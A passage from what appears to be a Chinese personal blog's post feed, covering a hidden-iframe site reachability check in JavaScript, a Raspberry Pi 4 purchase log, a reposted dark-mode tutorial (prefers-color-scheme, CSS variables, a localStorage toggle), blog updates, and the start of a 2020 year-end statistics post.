事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 